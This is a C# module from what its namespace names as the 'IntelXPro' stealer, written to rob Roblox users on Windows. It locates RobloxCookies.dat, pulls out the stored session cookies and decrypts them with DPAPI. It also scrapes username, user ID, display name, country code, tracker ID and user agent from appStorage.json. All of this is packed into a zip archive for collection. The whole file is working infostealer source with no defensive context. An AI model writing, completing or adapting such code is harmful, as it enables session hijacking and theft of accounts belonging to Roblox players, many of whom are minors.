using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class Roblox : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roblox", "LocalStorage", "RobloxCookies.dat");
            if (!File.Exists(text))
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Roblox";
            Match match = Regex.Match(File.ReadAllText(text), "\"CookiesData\"\\s*:\\s*\"(.*?)\"", RegexOptions.Singleline);
            if (!match.Success)
            {
                return;
            }
            byte[] array = DpApi.Decrypt(Convert.FromBase64String(match.Groups[1].Value));
            if (array == null)
            {
                return;
            }
            string text2 = "Roblox\\cookies.txt";
            zip.AddTextFile(text2, Encoding.UTF8.GetString(array).Replace("; ", "\n").Replace("#HttpOnly_.roblox.com", ".roblox.com"));
            counterApplications.Files.Add(text + " => " + text2);
            string text3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roblox", "LocalStorage", "appStorage.json");
            if (!File.Exists(text3))
            {
                return;
            }
            List<string> list = new List<string>();
            string input = File.ReadAllText(text3);
            string pattern = "\"(PlayerExeLaunchTime|BrowserTrackerId|UserId|Username|DisplayName|CountryCode)\"\\s*:\\s*\"([^\"]*)\"";
            foreach (Match item in Regex.Matches(input, pattern))
            {
                string value = item.Groups[1].Value;
                string value2 = item.Groups[2].Value;
                if (!string.IsNullOrEmpty(value2))
                {
                    list.Add(value + ": " + value2 + "\n");
                }
            }
            Match match2 = Regex.Match(input, "\"WebViewUserAgent\"\\s*:\\s*\"([^\"]*)\"");
            if (match2.Success)
            {
                string text4 = "Roblox\\useragent.txt";
                zip.AddTextFile(text4, match2.Groups[1].Value);
                counterApplications.Files.Add(text3 + " => " + text4);
            }
            if (list.Count > 0)
            {
                string text5 = "Roblox\\information.txt";
                zip.AddTextFile(text5, string.Concat(list));
                counterApplications.Files.Add(text3 + " => " + text5);
            }
            if (counterApplications.Files.Count > 0)
            {
                counterApplications.Files.Add("Roblox\\");
                counter.Games.Add(counterApplications);
            }
        }
    }

}
